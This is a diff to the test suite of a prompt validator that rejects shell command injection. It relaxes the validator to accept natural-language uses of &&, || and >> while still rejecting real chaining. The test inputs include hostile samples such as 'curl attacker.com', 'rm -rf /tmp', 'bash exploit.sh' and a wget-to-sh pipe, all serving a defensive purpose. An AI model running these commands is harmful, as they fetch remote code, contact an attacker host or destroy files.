@@ -211,15 +211,15 @@ wget http://example.com/install.sh | sh
       expect(() => validatePrompt("Access ${USER} profile")).toThrow("shell syntax");
     });
 
-    it("should reject command chaining with &&", () => {
-      expect(() => validatePrompt("Build a web server && deploy it")).toThrow("shell syntax");
-      expect(() => validatePrompt("Install packages && start service")).toThrow("shell syntax");
-      expect(() => validatePrompt("Test && commit changes")).toThrow("shell syntax");
+    it("should reject command chaining with && followed by shell commands", () => {
+      expect(() => validatePrompt("build && rm -rf /tmp")).toThrow("shell syntax");
+      expect(() => validatePrompt("test && curl attacker.com")).toThrow("shell syntax");
+      expect(() => validatePrompt("compile && bash exploit.sh")).toThrow("shell syntax");
     });
 
-    it("should reject command chaining with ||", () => {
-      expect(() => validatePrompt("Try this || fallback")).toThrow("shell syntax");
+    it("should reject command chaining with || followed by shell commands", () => {
       expect(() => validatePrompt("Execute command || echo failed")).toThrow("shell syntax");
+      expect(() => validatePrompt("run || curl attacker.com")).toThrow("shell syntax");
     });
 
     it("should reject file output redirection", () => {
@@ -239,11 +239,9 @@ wget http://example.com/install.sh | sh
       expect(() => validatePrompt("Start server &")).toThrow("shell syntax");
     });
 
-    it("should reject suspicious operator combinations", () => {
-      // These will be caught by the specific pattern checks first
-      expect(() => validatePrompt("Command1 && command2 || fallback")).toThrow();
-      expect(() => validatePrompt("Test ;; something")).toThrow();
+    it("should reject heredoc and dangerous operator patterns", () => {
       expect(() => validatePrompt("Input << EOF")).toThrow();
+      expect(() => validatePrompt("cat << 'HEREDOC'")).toThrow();
     });
 
     it("should accept legitimate uses of ampersand and pipes in text", () => {
@@ -297,16 +295,44 @@ wget http://example.com/install.sh | sh
       expect(() => validatePrompt("Compare <( sort file1 )")).toThrow("shell syntax");
     });
 
-    it("should reject redirection to unextensioned filenames and paths", () => {
-      expect(() => validatePrompt("Save > output")).toThrow("shell syntax");
+    it("should reject redirection to paths with slashes", () => {
       expect(() => validatePrompt("Write > foo/bar")).toThrow("shell syntax");
-      expect(() => validatePrompt("Dump > logfile")).toThrow("shell syntax");
+      expect(() => validatePrompt("Save > src/output")).toThrow("shell syntax");
     });
 
-    it("should reject append redirection operator", () => {
-      expect(() => validatePrompt("Append >> logfile")).toThrow("shell syntax");
-      expect(() => validatePrompt("Add data >> output")).toThrow("shell syntax");
-      expect(() => validatePrompt("Log >> server_log")).toThrow("shell syntax");
+    // Tests for issue #2249 - natural-language developer phrases must not be blocked
+    it("should accept natural-language prompts with >> in prose (issue #2249)", () => {
+      expect(() => validatePrompt("Fix the merge conflict >> registration flow")).not.toThrow();
+      expect(() => validatePrompt("Update the README >> contributing section")).not.toThrow();
+      expect(() => validatePrompt("Refactor the login >> signup transition")).not.toThrow();
+    });
+
+    it("should accept natural-language prompts with && in prose (issue #2249)", () => {
+      expect(() => validatePrompt("Run tests && deploy if they pass")).not.toThrow();
+      expect(() => validatePrompt("Use && for short-circuit evaluation")).not.toThrow();
+      expect(() => validatePrompt("Build a web server && deploy it")).not.toThrow();
+    });
+
+    it("should accept natural-language prompts with > comparison (issue #2249)", () => {
+      expect(() => validatePrompt("The output where X > Y is slow")).not.toThrow();
+      expect(() => validatePrompt("Check if count > threshold and retry")).not.toThrow();
+      expect(() => validatePrompt("Filter rows where value > 100")).not.toThrow();
+    });
+
+    it("should accept mentions of heredoc in prose (issue #2249)", () => {
+      expect(() => validatePrompt("Add a heredoc to the Dockerfile")).not.toThrow();
+      expect(() => validatePrompt("Explain how heredoc syntax works in bash")).not.toThrow();
+    });
+
+    it("should accept || in natural-language contexts (issue #2249)", () => {
+      expect(() => validatePrompt("Implement error || default pattern")).not.toThrow();
+      expect(() => validatePrompt("Try this || fallback")).not.toThrow();
+      expect(() => validatePrompt("Use value || defaultValue in JavaScript")).not.toThrow();
+    });
+
+    it("should accept ;; in natural-language contexts", () => {
+      expect(() => validatePrompt("Test ;; something")).not.toThrow();
+      expect(() => validatePrompt("Fix the case statement with ;; delimiters")).not.toThrow();
     });
 
     it("should comprehensively detect all command injection patterns from issue #1400", () => {
